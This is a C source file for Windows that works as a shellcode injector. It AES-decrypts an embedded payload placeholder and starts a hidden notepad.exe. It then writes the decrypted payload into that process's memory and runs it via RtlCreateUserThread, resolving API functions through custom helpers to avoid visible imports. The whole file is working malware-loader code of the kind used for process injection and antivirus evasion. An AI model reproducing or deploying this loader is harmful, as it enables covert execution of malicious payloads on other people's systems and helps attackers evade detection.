#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include "helpers.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <wchar.h>
#include <iostream>

//payload here

unsigned char key[] = {};
unsigned char payload[] = {};

unsigned int payload_len = sizeof(payload);


typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef BOOL (WINAPI * CreateProcessA_t)(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

typedef BOOL (WINAPI *CreateProcess_t)(
  LPCWSTR lpApplicationName,
  LPWSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCWSTR lpCurrentDirectory,
  LPSTARTUPINFOW lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

// Function pointer type for OpenProcess
typedef HANDLE (WINAPI * OpenProcess_t)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int Inject2(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	//NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateThreadEx");

	// Decrypt payload
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));

	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteCode, 0, &hThread, &cid);
	//pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, NULL, NULL, NULL, NULL, NULL);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
	

}

int main(void) {
  // Load the CreateProcess and OpenProcess functions from our helpers.h
  HMODULE hModule = hlpGetModuleHandle(L"KERNEL32.DLL");
  CreateProcess_t pCreateProcess = (CreateProcess_t) hlpGetProcAddress(hModule, "CreateProcessW");
  OpenProcess_t pOpenProcess = (OpenProcess_t) hlpGetProcAddress(hModule, "OpenProcess");

  // Check if the functions were loaded successfully
  if (pCreateProcess == NULL) {
    printf("Failed to load CreateProcess function!\n");
    return 1;
  }
  if (pOpenProcess == NULL) {
    printf("Failed to load OpenProcess function!\n");
    return 1;
  }
  // Set the path of the executable file for the process
  wchar_t processPath[] = L"C:\\Windows\\notepad.exe";

  // Set the parameters for the CreateProcess function
  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;  //notepad opens in background
  ZeroMemory(&pi, sizeof(pi));

  // Create the process
  BOOL success = pCreateProcess(NULL, processPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
  if (!success) {
    printf("Failed to create process (%d).\n", GetLastError());
    return 1;
  }

  // Get the handle to the process and its ID
  HANDLE hProc = pi.hProcess;
  DWORD processId = pi.dwProcessId;
  Inject2(hProc, payload, payload_len);

  // Close the handle to the process
  CloseHandle(hProc);

  return 0;
}


